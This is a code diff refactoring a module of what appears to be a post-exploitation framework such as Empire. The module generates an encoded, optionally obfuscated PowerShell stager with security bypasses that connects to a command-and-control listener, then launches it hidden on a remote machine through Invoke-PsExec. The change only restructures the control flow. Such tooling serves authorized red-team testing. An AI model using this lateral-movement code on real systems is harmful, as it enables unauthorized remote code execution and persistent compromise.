@@ -44,33 +44,32 @@ class Module:
                 # Store the result in a file
                 script_end += f' -ResultFile "{result_file}"'
 
+        elif not main_menu.listenersv2.get_active_listener_by_name(listener_name):
+            # not a valid listener, return nothing for the script
+            return handle_error_message("[!] Invalid listener: " + listener_name)
+
         else:
-            if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
-                # not a valid listener, return nothing for the script
-                return handle_error_message("[!] Invalid listener: " + listener_name)
+            # generate the PowerShell one-liner with all of the proper options set
+            launcher = main_menu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language="powershell",
+                encode=True,
+                obfuscate=launcher_obfuscate,
+                obfuscation_command=launcher_obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                bypasses=params["Bypasses"],
+            )
 
+            if launcher == "":
+                return handle_error_message("[!] Error in launcher generation.")
             else:
-                # generate the PowerShell one-liner with all of the proper options set
-                launcher = main_menu.stagers.generate_launcher(
-                    listenerName=listener_name,
-                    language="powershell",
-                    encode=True,
-                    obfuscate=launcher_obfuscate,
-                    obfuscation_command=launcher_obfuscate_command,
-                    userAgent=user_agent,
-                    proxy=proxy,
-                    proxyCreds=proxy_creds,
-                    bypasses=params["Bypasses"],
+                stager_cmd = (
+                    "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
+                    + launcher
                 )
-
-                if launcher == "":
-                    return handle_error_message("[!] Error in launcher generation.")
-                else:
-                    stager_cmd = (
-                        "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
-                        + launcher
-                    )
-                    script_end += f'Invoke-PsExec -ComputerName {computer_name} -ServiceName "{service_name}" -Command "{stager_cmd}"'
+                script_end += f'Invoke-PsExec -ComputerName {computer_name} -ServiceName "{service_name}" -Command "{stager_cmd}"'
 
         outputf = params.get("OutputFunction", "Out-String")
         script_end += (
